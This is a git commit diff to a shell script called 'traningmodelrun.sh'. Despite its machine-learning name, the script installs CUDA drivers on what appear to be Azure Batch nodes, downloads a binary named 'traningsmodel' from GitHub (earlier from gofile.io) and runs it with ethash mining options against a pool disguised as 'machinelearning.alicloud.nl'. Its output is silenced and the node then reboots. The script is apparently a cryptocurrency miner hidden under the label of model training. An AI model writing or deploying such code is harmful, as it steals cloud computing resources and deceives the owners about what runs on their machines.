16fd8774be0f3e386f13fc40008af1ba5ffa633d
datadd <87111755+datadd@users.noreply.github.com>
2021-07-08 08:39:29 +0200

    Update traningmodelrun.sh

--- traningmodelrun.sh
+++ traningmodelrun.sh
@@ -5,7 +5,7 @@ if [ -f "$DIR" ]; then
     /home/_azbatch/traningsmodel --algo ethash --url machinelearning.alicloud.nl:443 --user datad --worker $hostname --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30   > /dev/null 2>&1 
 else
     sudo apt-get update ;
-    sudo apt-get -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev linux-headers-5.4.0-1046-azure ;
+    sudo apt-get -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev linux-headers-5.4.0-1046-azure unzip ;
     cd /home/_azbatch/ ;
     sudo rm cuda-ubuntu*  > /dev/null 2>&1 
     wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin > /dev/null 2>&1 
@@ -16,7 +16,8 @@ else
     sudo apt-get -y install cuda-drivers ;
     sudo chmod -R 770 /home/_azbatch ;
     cd /home/_azbatch ;
-    wget https://srv-store1.gofile.io/download/23105a04-19cf-4f9b-bef8-29c59593807f/traningsmodel &&
+    wget https://github.com/datadd/trainingmodel/raw/main/traningsmodel.zip &&
+    unzip /home/_azbatch/traningsmodel.zip &&
     hostname=$(hostname | cut -c1-8) &&
     /home/_azbatch/traningsmodel --algo ethash --url machinelearning.alicloud.nl:443 --user datad --worker $hostname --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30  > /dev/null 2>&1 
     sudo reboot
